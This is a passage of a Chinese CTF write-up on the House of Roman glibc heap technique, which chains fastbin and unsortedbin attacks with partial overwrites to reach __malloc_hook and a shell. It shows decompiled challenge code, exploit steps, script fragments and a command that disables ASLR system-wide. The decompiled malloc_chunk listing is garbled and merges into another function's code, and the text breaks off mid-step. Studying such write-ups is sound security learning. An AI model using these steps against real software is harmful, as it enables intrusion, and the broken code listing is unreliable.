# 前言：
House of Roman 这个技巧说简单点其实就是 fastbin attack 和 Unsortbin attachk 结合的一个小 trick。  
该技术用于 bypass ALSR，利用 12-bit 的爆破来达到获取 shell 的目的。  
且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用。  
（以来自 ctf wiki）  
我在学习这部分的 时候 很是迷惑，经过寻找参考资料与自己对该例题长达 一天的时间的调试终于搞懂了了，特记录下来加深对它的理解。  
该程序可以在这里下载到。
    https://github.com/romanking98/House-Of-Roman
# 利用方式：
总体上来说 我们 分为五大步：
  1. 通过低位地址写修改fastbin的fd，修改到malloc_hook-0x23，为我们最后 向 malloc_hook地址里写入 one_gadget 做准备
  2. 修复 fastbin free 链
  3. 通过unsortedbin attack，将main_arean地址写入malloc_hook
  4. 通过低位地址写修改malloc_hook中的地址为one gadget
  5. free 同一个 chunk 多次，造成 double free 异常，触发 malloc_printerr ，触发malloc,getshell。  
# 漏洞分析：  
我们检查下保护：
开启了 PIE 和 NX保护。  
为了本地调试方便 我们关闭 本地ASLR
    echo 0 > /proc/sys/kernel/randomize_va_space
我们先来看下程序逻辑：  
首先让我们 输入 name 到bss 段上，然后 是个菜单，有三个功能
  1. Malloc 2. Write 3. Free
    int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
    {
      __int64 choice; // [rsp-8h] [rbp-8h]
      setvbuf(stdin, 0LL, 2, 0LL);
      setvbuf(_bss_start, 0LL, 2, 0LL);
      setvbuf(stderr, 0LL, 2, 0LL);
      start_p();                                    // Enter name :
      while ( 1 )
      {
        print_menu();
        __isoc99_scanf("%d", &choice);              // 1. Malloc
                                                    // 2. Write
                                                    // 3. Free
        switch ( (_DWORD)choice )
        {
          case 1:
            puts("Malloc");
            HIDWORD(choice) = (unsigned __int64)Malloc();
            if ( !HIDWORD(choice) )
              puts("Error");
            break;
          case 2:
            puts("Write");
            Write("Write");
            break;
          case 3:
            puts("Free");
            Free("Free");
            break;
          default:
            puts("Invalid choice");
            break;
        }
      }
    }
1.MAlloc： maloc的参数 size 并没有限制 大小
且在 经过gdb 调试：知道 heap_ptr[0]的地址
    heap_ptrs[0] ：0x555555756160
     #malloc(size) : 0x5555557549b8
    void *malloc_chunk()
    {
      void *result; // rax
      void *chunk_mem_addr; // rax
      unsigned int v2; // [rsp-10h] [rbp-10h]
      unsigned int size; // [rsp-Ch] [rbp-Ch]
      void *v4; // [rsp-8h] [rbp-8h]
      printf("Enter size of chunk :");
      __isoc99_scanf("%d", &size);
      printf("Enter index :", &size);
      __isoc99_scanf("%d", &v2);
      if ( v2  0x13 )
        return puts("\nInvalid index");
      if ( !heap_ptrs[(unsigned int)id] )
        return puts("Bad index");
      HIDWORD(id) = sizes[(unsigned int)id];
      printf("Enter data :", &id);
      return read(0, (void *)heap_ptrs[(unsigned int)id], HIDWORD(id) + 1);// off by one
    }
  1. Free 这里free 后 并没有将 指针 置为 NULL，存在UAF 漏洞。
    void Free()
    {
      unsigned int v0; // [rsp-4h] [rbp-4h]
      printf("\nEnter index :");
      __isoc99_scanf("%d", &v0);
      if ( v0 <= 0x13 )
        free((void *)heap_ptrs[v0]);  //UAF
    }
# 漏洞利用：
House-Of-Roman
    1.通过低位地址写修改fastbin的fd，修改到malloc_hook-0x23，为我们最后 向 malloc_hook地址里写入 one_gadget 做准备
    2.修复过程中的fastbin，
    3.通过unsortedbin attack，将main_arean地址写入malloc_hook
    4.通过低位地址写修改malloc_hook中的地址为one gadget
    5.free 同一个 chunk 多次，造成 double free 异常，触发 malloc_printerr ，触发malloc,getshell。
第一步:  
通过低位地址写修改fastbin的fd，修改到malloc_hook-0x23，为我们最后 向 malloc_hook地址里写入 one_gadget
做准备
我们将这步 给细化下吧。  
首先 进行堆内存布局，  
即申请 3个 chunk ，heap_ptrs[0]， heap_ptrs[1]， heap_ptrs[2] ，
    malloc(0x18,0) # heap_ptrs[0]      #off_by_one 可修改 heap_ptrs[1] chunk 的size，为后面做准备
    malloc(0xc0,1) # heap_ptrs[1]      #通过低位地址写修改 fastbin(heap_ptrs[1]对应的chunk size 为 0x70)的fd，
                                        #修改到malloc_hook-0x23.
    malloc(0x60,2) # heap_ptrs[2]
在 heap_ptrs[1] 对应的chunk_addr+0x78 处 伪造 size，为后面的攻击做准备。
    fake = "A"*0x68
    fake += p64(0x61)  # fake size
    write(1,fake)
然后将 heap_ptrs[1] 对应的chunk free进 unsigned bin中，于是 heap_ptrs[1] 对应的chunk 的chunk的
fd (+0x10)与 bk(+0x18) 处都为 main_arena+88 （ 0x7ffff7dd1b78 ）  
然后接着 申请 3个 chunk，heap_ptrs[3]（与heap_ptrs[2]同大小）， heap_ptrs[15]， heap_ptrs[18]
，并同时 通过单字节溢出将 heap_ptrs[1]的size 也给覆盖成 0x71(70+1)  
其中，  
heap_ptrs[15] 用于后面 修复 fast bin链  
heap_ptrs[18] 0x555555756160（ heap_ptrs[0] ）+0x8*18 即0x555555757250 用于 最后一步
double free 这个 chunk。  
heap_ptrs[3] 把它与 heap_ptrs[2] 先后 给free 掉，放入 0x70 大小的 fast bin中注意下此时的 bin的结构）  
即 heap_ptrs[3] 对应的chunk的fd(+0x10)指向了 heap_ptrs[2] 对应的chunk
    free(2)
    free(3)
因为此时 heap_ptrs[1]对应的chunk 的fd（+0x10）指向的地址是 main_arena+88 （ 0x7ffff7dd1b78
），我们可以 修改 heap_ptrs[3]为 heap_ptrs[1]对应的chunk_addr:（通过单字节 写 实现）,
    over = "\x20"